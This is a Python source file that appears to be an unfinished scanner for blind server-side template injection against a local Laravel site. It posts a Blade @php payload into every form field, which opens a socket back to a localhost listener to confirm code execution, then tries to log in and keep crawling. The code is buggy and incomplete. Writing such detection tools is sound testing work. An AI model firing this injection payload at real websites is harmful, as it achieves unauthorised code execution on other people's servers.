import re
import sys
import requests
import subprocess


def get_page_urls(html):
    """
    This function gets all href data in <a> tags and verifies which of them are in the current domain and removes extra
    characters if so
    """

    link_collection = re.findall(r"(href[a-zA-Z0-9 _=:.\"/'\\\\]*)+", str(html))

    required_links = []
    for link in link_collection:
        if (link.find("127.0.0.1:8000") != -1):
            modif_link = link.replace("href=\"", '')
            modif_link = modif_link.replace("\"", '')
            required_links.append(modif_link)

    return required_links


def locate_input_points(html):
    """
    This function finds all text input tags and returns their names
    """

    # find all input tags including token
    input_collection = re.findall(r"(<input [a-zA-Z0-9 _=\"\-'\\\\]*>)+", str(html))
    textarea_collection = re.findall(r"(<textarea [a-zA-Z0-9 _:;=\"\-'\\\\]*>)+", str(html))
    total_inputs = input_collection+textarea_collection

    all_names = []  # array containing necessary input tags which will be used later
    for elem in total_inputs:  # loop through inputs, remove token & submit input
        if "_token" in elem:
            total_inputs.remove(elem)
        elif "type='submit'" in elem:
            total_inputs.remove(elem)

    for inp in total_inputs:  # filter through remaining valid inputs storing the names
        all_names += re.findall(r"(name=[\\\\'a-zA-Z0-9\"'\\\\']+)", inp)

    final_names = []
    for elem in all_names:  # Clean names
        temp_name = elem.replace("name=", "")
        temp_name = temp_name.replace("'", "")
        final_names.append(temp_name)

    return final_names


def filter_links(all_urls):
    """
    This function checks for duplicates in the total collection of links in the website and removes them
    """

    all_urls = list(dict.fromkeys(all_urls))
    return all_urls


def post_url(html):
    """
    This function finds all form action links in a page, and returns only the required form action links
    """

    post_link = re.findall(r"action=([a-zA-Z0-9 _:;=./\"'\\\\]+)", html)[0]

    #for link in post_links:
    formatted_link = re.findall(r"(http://[a-zA-Z0-9_:;=./\\\\]+)", post_link)[0]
    #formatted_links.append(formatted_link[0])

    return formatted_link


def get_token(html):
    """
    This function grabs the token for each given form
    """

    token = re.findall(r'<input type="hidden" name="_token" value="(.*)"', html)[0]
    return token


def get_forms(html):
    """
    This function takes html and finds all forms and their encapsulated html. It will extract action links and their inputs
    and pair them together.
    """

    form_groups = re.findall(r"(action=[a-zA-Z0-9 _:;=./\"\-<>\s'\\\\]+</form>)+", html)

    link_groups = {}
    for group in form_groups:
        action_link = post_url(group)
        input_links = locate_input_points(group)
        link_groups[action_link] = input_links

    return link_groups


def check_login_form(form_groups):
    """This function will check a collection of form groups to check if a login form is present in one of them"""

    for group in form_groups:  # Check each form group
        inputs = form_groups[group]

        for inp in inputs:  # Check each input of each form group
            if "password" in inp:  # If an input has a password field than we return the whole group
                return group, inputs

    return "0", 0



def test_blind_posterior(urls):
    """
    This function performs SSTI on all forms in pages. This works by sending a connection request to a socket
    server that will run after all forms have been filled. The socket server will then confirm injection success based
    on if a connection is received or not.
    """

    login_url = ""
    login_inputs = {}
    token = ""

    for url in urls:
        session = requests.session()
        front = session.get(url)

        try:
            token = get_token(front.text)
            cookies = session.cookies

            post_data = {}
            groups = get_forms(front.text)

            login_url, login_inputs = check_login_form(groups)


            for group in groups:
                # Get the inputs for each form group iteratively
                inputs = groups[group]

                for inp in inputs:  # Give each input a value and add to dictionary
                    post_data[inp] = f"""@php 
                                              try{{
                                                  $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
                                                  $url = $protocol . $_SERVER['SERVER_NAME'] . ":". $_SERVER['SERVER_PORT'] . $_SERVER['REQUEST_URI']; 
                                                  $sock = fsockopen('localhost', 9000);
                                                  fwrite($sock, 'Injection detected from form {group}, on page: {url}. Code was executed on '. $url); 
                                                  fclose($sock);
                                              }}
                                              catch(Exception $e){{}}
                                         @endphp"""
                post_data["_token"] = token  # Add token last
                requests.post(group, post_data, cookies=cookies)

        except IndexError:
            continue

    server_instance = subprocess.Popen(['python', 'SocketServer.py', ' '.join(urls)])
    # while server_instance.poll() is None:
    #     if(server_instance.poll() != None):
    #         break
    #     pass

    login_creds = sys.argv[1]  # Getting the login credentials inputted at the beginning
    blind_data = {}

    for inpt in login_inputs:  # For each input found in the login form
        count = 0
        blind_data[inpt] = login_creds[count]  # use the name of the input and inputted credential
        count+=1


    blind_session = requests.session()  # Create a blind session
    blind_cookies = blind_session.cookies

    login_page = blind_session.get(login_url)  # Get the login page html

    login_token = get_token(login_page.text)  # Extract the form token
    blind_data["_token"] = login_token

    login_response = blind_session.post(login_url, blind_data, blind_cookies)  # Performing login

    if(login_response.status_code == 200):  # Login successful
        front = login_response.text
        new_urls = get_page_urls(front)

        # continue here, find new urls and filter from previously found URLs, and visit them
    else:
        print("\n\nFailed to authenticate to perform blind scan. The scan will now stop\n\n")




urls = sys.argv[1]
urls_list = list(urls.split(" "))
test_blind_posterior(urls_list)
